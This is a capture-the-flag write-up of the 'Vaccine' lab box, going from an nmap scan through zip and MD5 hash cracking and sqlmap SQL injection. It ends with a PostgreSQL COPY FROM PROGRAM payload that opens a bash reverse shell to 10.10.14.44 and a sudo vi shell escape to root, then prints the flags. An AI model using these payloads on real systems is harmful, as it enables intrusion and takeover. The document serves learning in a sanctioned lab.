
## CTF Writeup: Vaccine

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.95.174                         
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-15 19:26 -0500
Nmap scan report for 10.129.95.174
Host is up (0.024s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.44
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.15 seconds
```

The target seems to be running an HTTP Server & an FTP Service. Let's first checkout FTP.

```
ftp 10.129.95.174 21
Connected to 10.129.95.174.
220 (vsFTPd 3.0.3)
Name (10.129.95.174:saitama): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10206|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> get backup.zip
```

Tried to unzip the backup.zip but didn't work since it requires password authentication.

```
unzip backup.zip
```

Let's convert the .zip file to hash format, so we can potentially bruteforce the password.

```
zip2john backup.zip > hash
```

Bruteforced an password out of the hash using john the ripper.

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)     
1g 0:00:00:00 DONE (2026-08-15 19:28) 16.66g/s 273066p/s 273066c/s 273066C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Unzipped the .zip file.

```
unzip backup.zip
```

Gained index.php file. Retrieved credentials and encoded password.

```
cat index.php | grep admin
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
```

We got the information that the password seems to be encrypted in MD5.

```
admin:2cb42f8734ea607eefed3b70af13bbd3
```

Let's utilize crackstation.net to decrypt the password.

```
admin:qwerty789
```

Upon navigating to the http website we get forwarded to "MegaCorp Login".

Connected with the retrieved credentials.

The webpage it self doesn't have many functionality besides an search parameter and a list of car names. Let's store the names of the cars in an users.txt wordlist.

```
Elixir
Sandy
Meta
Zeus
Alpha
Canon
Pico
Vroom
Lazer
Force
```

I typed an ' into the search parameter and it broke the query. Let's try & get the network package in order to run sqlmap over it, to check if we can leverage SQLi.

Started up my web proxy tool BurpSuite. Activated Interception and activated HTTP Web Proxy Foxy Tool so the web traffic gets redirected to my web proxy tool.

Stored the network package inside an sql.req file on my local machine.

```
cat sql.req 
GET /dashboard.php?search= HTTP/1.1
Host: 10.129.95.174
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://10.129.95.174/dashboard.php?search=
Cookie: PHPSESSID=lf1nd26h336heu6h7986clbm0a
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Successfully enumerated databases.

```
sqlmap -r sql.req --batch --dbs
available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public
```

The "public" database seems like we can enumerate it.

Enumerated all databases, but couldn't find anything interesting. Let's try & bruteforce ssh with our wordlist.

Didn't work. Since we know the database is an postgresql database, let's try & leverage an reverse shell sqli query. 

Started up listener on port 1337.

```
nc -lvnp 1337
```

Executed the following query.

```
';DROP TABLE IF EXISTS cmd_out;CREATE TABLE cmd_out(d text);COPY cmd_out FROM PROGRAM '/bin/bash -c "bash -i > /dev/tcp/10.10.14.44/1337 0<&1 2>&1"'--
```

Gained RCE as user "postgres".

```

```

Performed Shell Hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Found the password of the postgres database admin in /var/www/html/dashboard.php

```
postgres:P@s5w0rd!
```

Enumerated sudo permissions of the postgres user.

```
postgres@vaccine:~$ sudo -l
[sudo] password for postgres: 
Sorry, try again.
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

He's able to run the vi binary as root user. Checked up on gtfobins.org for PoC's. Utilized the following:

```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Once I was in the conf file / vi session I did the following and gained root shell.

```
:shell
```

Retrieved user.txt in /var/lib/postgresql

```
ec9b13ca4d6229cd5cc1e09980965bf7
```

Retrieved root.txt in /root directory.

```
dd6e058e814260bc70e9bbdef2715849
```